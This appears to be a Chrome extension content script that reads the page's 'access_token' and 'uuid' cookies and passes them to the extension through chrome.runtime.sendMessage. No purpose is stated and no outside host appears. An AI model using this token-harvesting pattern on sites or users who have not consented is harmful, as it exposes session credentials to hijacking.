function getCookie(n) {
  let a = `; ${document.cookie}`.match(`;\\s*${n}=([^;]+)`);
  return a ? a[1] : '';
}

chrome.runtime.sendMessage({
  type: 1,
  data: {
    token: getCookie('access_token'),
    uuid: getCookie('uuid'), 
  }
}, () => {});
